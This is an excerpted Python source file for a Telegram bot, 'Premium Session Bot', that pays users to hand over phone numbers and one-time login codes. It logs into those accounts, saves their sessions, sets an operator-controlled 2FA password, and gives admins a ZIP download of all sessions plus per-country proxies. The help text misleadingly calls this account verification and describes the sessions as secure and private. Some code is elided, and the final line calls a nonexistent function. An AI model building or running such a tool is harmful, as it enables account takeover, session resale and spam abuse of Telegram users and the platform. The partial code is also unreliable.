...
def init_db():
    def operation(cursor):
        ...
        cursor.execute("CREATE TABLE IF NOT EXISTS pending_approvals (phone_number TEXT PRIMARY KEY, user_id INTEGER, status TEXT DEFAULT 'pending', timestamp TEXT)")
...
def send_join_required_message(chat_id):
    markup = types.InlineKeyboardMarkup()
    channel_button = types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_URL)
    group_button = types.InlineKeyboardButton("👥 Join Group", url="https://t.me/telecatchchat")
    check_button = types.InlineKeyboardButton("✅ Verify Join", callback_data="verify_join")
    markup.add(channel_button, group_button)
    markup.add(check_button)
    
    bot.send_message(chat_id, "🔒 Please join our channel and group to use the bot!", reply_markup=markup)
...
def membership_required(func):
    def wrapper(message):
        ...
        if check_membership(user_id):
            ...
            send_join_required_message(message.chat.id)
    return wrapper
...
def verify_join_callback(call):
    ...
    try:
        if check_membership(user_id):
            ...
            bot.answer_callback_query(call.id, "❌ Please join both channel and group first.")
    except Exception as e:
...
async def send_login_code(chat_id, phone_number, message_id):
    try:
        ...
        for i in range(5, 0, -1):
            try:
                bot.edit_message_text(
                    f"🔄 Processing please wait... ({i}sec)", 
                    chat_id, 
                    message_id
                )
            except:
        ...
        def operation(cursor):
            ...
            cursor.execute("INSERT OR REPLACE INTO pending_approvals (phone_number, user_id, timestamp) VALUES (?, ?, ?)",
                         (phone_number, chat_id, time.strftime("%Y-%m-%d %H:%M:%S")))
        
        thread_safe_db_operation(operation)

        flag = "".join(chr(ord(c) + 127397) for c in country_code.upper()) if country_code else "🌍"
        msg_text = f"🔢 We are send a code following number. Enter correct OTP:\n\n{flag} {phone_number}\n\n➿ /cancel - for cancel this optimize"
        ...
        # Start timeout timer
        timeout_thread = threading.Timer(200, handle_otp_timeout, args=[chat_id, phone_number])
...
def handle_otp_timeout(chat_id, phone_number):
    user_state = get_user_data(chat_id)
    if user_state and user_state.get("state") == "awaiting_code" and user_state.get("phone") == phone_number:
        try:
            bot.send_message(chat_id, "❌ OTP entry timeout. Process cancelled.")
            delete_user_data(chat_id)
            ...
            def operation(cursor):
                ...
                if phone_number in pending_numbers:
                    ...
                    cursor.execute("DELETE FROM pending_approvals WHERE phone_number = ?", (phone_number,))
            
            thread_safe_db_operation(operation)
        except Exception as e:
            logging.error(f"Error handling OTP timeout: {e}")
        ...
        if is_spam:
            def operation(cursor):
                ...
                if phone in pending_numbers:
                    ...
                    new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                    cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
                    cursor.execute("UPDATE pending_approvals SET status = 'frozen' WHERE phone_number = ?", (phone,))
            
            thread_safe_db_operation(operation)
            frozen_message = f"""⚠️ <b>Important Notice</b>

The account <code>{phone}</code> has been <b>frozen</b> due to a violation of Telegram guidelines.
Please <b>do not add any balance</b> to this account."""
            
            bot.edit_message_text(frozen_message, chat_id, processing_msg_id, parse_mode="HTML")
            return
        ...
        def operation(cursor):
            ...
            if phone in pending_numbers:
                ...
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
                cursor.execute("DELETE FROM pending_approvals WHERE phone_number = ?", (phone,))
...
async def auto_claim_balance(user_id, phone_number, message_id, session_filename):
    ...
    try:
        ...
        if not await client.is_user_authorized():
            def operation(cursor):
                ...
                if phone_number in pending_numbers:
                    ...
                    cursor.execute("UPDATE pending_approvals SET status = 'failed' WHERE phone_number = ?", (phone_number,))
        ...
        # Check if account is frozen during claim time
        is_frozen = await check_spam_status(client, phone_number, user_id, message_id)
        if is_frozen:
            def operation(cursor):
                cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (user_id,))
                pending_str_tuple = cursor.fetchone()
                ...
                if phone_number in pending_numbers:
                    ...
                    new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                    cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, user_id))
                    cursor.execute("UPDATE pending_approvals SET status = 'frozen' WHERE phone_number = ?", (phone_number,))
...
Please <b>do not add any balance</b> to this account."""
        ...
        def operation(cursor):
            ...
            cursor.execute("UPDATE pending_approvals SET status = 'approved' WHERE phone_number = ?", (phone_number,))
        ...
        if amount_added:
            success_text = f"✅ Congratulations, the account {phone_number} has been successfully verified."
...
def command_start(message):
    ...
    try:
        ...
        welcome_text = """🚀 **Welcome to Premium Session Bot** ✨
...
def command_cancel(message):
    ...
    if user_state and user_state.get("state") == "awaiting_code":
        delete_user_data(message.from_user.id)
        
        def operation(cursor):
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (message.from_user.id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            if user_state.get("phone") in pending_numbers:
                pending_numbers.remove(user_state.get("phone"))
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, message.from_user.id))
                cursor.execute("DELETE FROM pending_approvals WHERE phone_number = ?", (user_state.get("phone"),))
        
        thread_safe_db_operation(operation)
        bot.send_message(message.chat.id, "❌ Process cancelled.")
    else:
        bot.send_message(message.chat.id, "❌ No active process to cancel.")

@bot.message_handler(commands=["help"])
@membership_required
def command_help(message):
    help_text = """📖 **Help Guide - Premium Session Bot**

🤖 **About This Bot:**
This bot helps you earn money by verifying Telegram accounts. Simply provide phone numbers, complete verification, and earn rewards!

🛠 **Available Commands:**
• /start - Begin using the bot
• /capacity - View available countries & earning rates
• /account - Check your balance & statistics  
• /withdraw - Withdraw your earnings
• /cancel - Cancel current verification process
• /help - Show this help message

💰 **Earning System:**
- Different countries have different earning rates
- Accounts are verified automatically
- Balance is added after successful verification
- Minimum withdrawal: $2.0
...
🔐 **Security:**
- All sessions are secure and private
- Automatic 2FA setup for protection
...
⚠️ **Important Notes:**
- Use real, active phone numbers
- Ensure numbers are not already used with Telegram
- Follow Telegram guidelines to avoid restrictions
- Contact admin for any issues

Start earning now by sending your phone number! 📱"""
...
def command_withdraw(message):
    ...
    withdraw_text = "💳 **Select withdrawal method:**"
...
def user_withdraw_callback(call):
    command_withdraw(call.message)
    bot.answer_callback_query(call.id)
    ...
    try:
        ...
        if is_admin(chat_id) and user_state:
            ...
            if state == "awaiting_broadcast":
                ...
                return
            elif state == "awaiting_proxy_info":
                admin_process_proxy_setup(message)
                return
            elif state == "awaiting_check_balance":
                admin_process_check_balance(message)
                return
...
def process_phone_number(message):
    ...
    # Start login process
    processing_msg = bot.send_message(chat_id, "🔄 Processing please wait...")
...
def process_verification_code(message, code):
    ...
    # Check if OTP is expired (200 seconds)
    if time.time() - user_state.get("code_sent_time", 0) > 200:
        bot.send_message(chat_id, "❌ OTP entry timeout. Please start again.")
        delete_user_data(chat_id)
        return
    
    phone = user_state["phone"]
    processing_text = "🔄 Connecting, kindly wait..."
...
def admin_panel(message):
    ...
    def operation(cursor):
        ...
        return total_users, total_balance, pending_withdrawals, current_password, pending_approvals
    
    result = thread_safe_db_operation(operation)
    if result:
        total_users, total_balance, pending, current_password, pending_approvals = result
    else:
        total_users, total_balance, pending, current_password, pending_approvals = 0, 0, 0, "@Riyad12", 0
...
🔐 Current 2FA Password: {current_password}"""
    ...
    markup.add(types.InlineKeyboardButton("📊 Manage Rates", callback_data="admin_rates_menu"),
               types.InlineKeyboardButton("💰 Balance Management", callback_data="admin_balance_menu"))
    markup.add(types.InlineKeyboardButton("👑 Admin Management", callback_data="admin_admins_menu"),
               types.InlineKeyboardButton("⏳ Pending Approvals", callback_data="admin_pending_approvals"))
    markup.add(types.InlineKeyboardButton("🔧 Proxy Setup", callback_data="admin_proxy_setup"),
    ...
    markup.add(types.InlineKeyboardButton("📁 Download Sessions ZIP", callback_data="admin_sessions_zip"),
               types.InlineKeyboardButton("🗑️ Clear Session Files", callback_data="admin_clear_sessions"))
    markup.add(types.InlineKeyboardButton("🚦 Toggle 2FA", callback_data="admin_toggle_2fa"),
               types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="admin_change_2fa_password"))
...
def admin_callback_handler(call):
    ...
    if action == "users":
        ...
        markup.add(types.InlineKeyboardButton("🗑️ Remove Country", callback_data="admin_remove_country"))
        ...
        country_list = thread_safe_db_operation(operation)
        bot.send_message(chat_id, f"**Current Countries:**\n{country_list}\n\nSend country name to remove completely:", parse_mode="Markdown")
        set_user_data(chat_id, {"state": "awaiting_remove_country"})
        ...
        show_pending_approvals(chat_id)

    elif action == "proxy_setup":
        bot.send_message(chat_id, "Send proxy info in format:\n`CountryCode ProxyType IP Port Username Password`\n\nExample: `BD socks5 127.0.0.1 8080 user pass`")
        set_user_data(chat_id, {"state": "awaiting_proxy_info"})

    elif action == "check_balance":
        bot.send_message(chat_id, "Send User ID to check balance:")
        set_user_data(chat_id, {"state": "awaiting_check_balance"})
...
# New admin functions for pending approvals
def show_pending_approvals(chat_id):
    def operation(cursor):
        cursor.execute("""
            SELECT pa.phone_number, pa.user_id, pa.timestamp, u.full_name 
    ...
    pending = thread_safe_db_operation(operation) or []
    
    if not pending:
        bot.send_message(chat_id, "✅ No pending approvals.")
        return
    
    text = "⏳ **Pending Account Approvals**\n\n"
    for phone, user_id, timestamp, name in pending:
        text += f"• {phone} - {name or user_id} - {timestamp}\n"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔄 Refresh", callback_data="admin_pending_approvals"))
...
def admin_process_proxy_setup(message):
    try:
        parts = message.text.split()
        if len(parts) < 6: 
            bot.reply_to(message, "❌ Invalid format. Use: CountryCode ProxyType IP Port Username Password")
            return
        
        country_code, proxy_type, ip, port, username, password = parts[0], parts[1], parts[2], parts[3], parts[4], parts[5]
        
        # Validate country code
        try:
            country = pycountry.countries.get(alpha_2=country_code.upper())
            if not country:
                bot.reply_to(message, f"❌ Invalid country code: {country_code}")
                return
        except:
            bot.reply_to(message, f"❌ Invalid country code: {country_code}")
            return
        ...
        if proxy_type.lower() not in ['socks5', 'http']:
            bot.reply_to(message, "❌ Proxy type must be 'socks5' or 'http'")
            return
        
        # Update proxy database
        PROXIES_DATABASE[country_code.upper()] = {
        ...
        bot.reply_to(message, f"✅ Proxy for {country_code} set successfully!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error setting proxy: {e}")
    finally:
        delete_user_data(message.chat.id)

def admin_process_check_balance(message):
    try:
    ...
    def operation(cursor):
        cursor.execute("SELECT balance, full_name, verified_count, total_earned FROM users WHERE user_id = ?", (user_id,))
        return cursor.fetchone()
    
    result = thread_safe_db_operation(operation)
    if result:
        balance, name, verified, earned = result
        text = f"""📊 **User Balance Info**

👤 User: {name or 'N/A'} (ID: {user_id})
💰 Balance: ${balance:.2f}
✅ Verified Numbers: {verified}
💸 Total Earned: ${earned:.2f}"""
...
def clear_session_files(chat_id):
    for filename in os.path.listdir(SESSIONS_FOLDER):
